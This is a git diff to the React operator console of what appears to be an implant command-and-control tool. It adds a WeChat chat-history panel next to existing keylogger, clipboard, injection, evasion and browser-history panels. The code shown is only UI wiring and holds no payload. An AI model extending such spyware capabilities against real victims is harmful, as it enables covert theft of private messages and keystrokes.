@@ -40,6 +40,7 @@ const EvasionSection = lazy(() => import("./components/EvasionSection"));
 const InjectSection = lazy(() => import("./components/InjectSection"));
 const TimelineSection = lazy(() => import("./components/TimelineSection"));
 const BrowserHistorySection = lazy(() => import("./components/BrowserHistorySection"));
+const WeChatHistorySection = lazy(() => import("./components/WeChatHistorySection"));
 const KeyloggerSection = lazy(() => import("./components/KeyloggerSection"));
 const ClipboardSection = lazy(() => import("./components/ClipboardSection"));
 const WallpaperSection = lazy(() => import("./components/WallpaperSection"));
@@ -605,6 +606,8 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
               {sectionSupported("registry", { isCImplant: isC }) && (<Suspense fallback={null}><RegistrySection agentId={id} online={status === "online"} /></Suspense>)}
 
               {sectionSupported("browserhistory", { isCImplant: isC }) && (<Suspense fallback={null}><BrowserHistorySection agentId={id} online={status === "online"} /></Suspense>)}
+
+              {sectionSupported("wechathistory", { isCImplant: isC }) && (<Suspense fallback={null}><WeChatHistorySection agentId={id} online={status === "online"} /></Suspense>)}
 
               {sectionSupported("keylogger", { isCImplant: isC }) && (<Suspense fallback={null}><KeyloggerSection agentId={id} online={status === "online"} /></Suspense>)}
 
